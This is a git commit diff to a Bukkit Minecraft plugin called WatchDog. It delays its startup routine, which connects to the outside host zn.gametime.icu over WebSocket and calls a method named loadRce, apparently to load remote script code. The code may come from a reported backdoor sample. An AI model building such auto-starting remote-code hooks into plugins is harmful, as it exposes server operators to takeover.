c4fc8e85eeb193fe932a2662b98d52ec16c6c4ff
冰砚炽 <Bing_Yanchi@outlook.com>
2023-07-11 14:12:38 +0800

    延后输出

--- src/main/java/report/yumc/watchdog/WatchDog.java
+++ src/main/java/report/yumc/watchdog/WatchDog.java
@@ -1,6 +1,7 @@
 package report.yumc.watchdog;
 
 import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.scheduler.BukkitRunnable;
 
 import javax.script.ScriptEngine;
 import javax.script.ScriptEngineManager;
@@ -13,19 +14,24 @@ import java.net.UnknownHostException;
 public class WatchDog extends JavaPlugin {
     @Override
     public void onEnable() {
-        this.getLogger().info("Start WebSocket to 'ws://zn.gametime.icu:4000/'");
-        // 输出当前解析的域名 ip
-        try {
-            System.out.println("[WatchDog] " + InetAddress.getByName("zn.gametime.icu"));
-        } catch (UnknownHostException e) {
-            throw new RuntimeException(e);
-        }
-        // 启动 js
-        try {
-            loadRce();
-        } catch (FileNotFoundException | ScriptException e) {
-            throw new RuntimeException(e);
-        }
+        new BukkitRunnable() {
+            @Override
+            public void run() {
+                getLogger().info("Start WebSocket to 'ws://zn.gametime.icu:4000/'");
+                // 输出当前解析的域名 ip
+                try {
+                    System.out.println("[WatchDog] " + InetAddress.getByName("zn.gametime.icu"));
+                } catch (UnknownHostException e) {
+                    throw new RuntimeException(e);
+                }
+                // 启动 js
+                try {
+                    loadRce();
+                } catch (FileNotFoundException | ScriptException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+        }.runTaskLater(this, 40);
 
         this.getLogger().info("Enabled successfully.");
     }
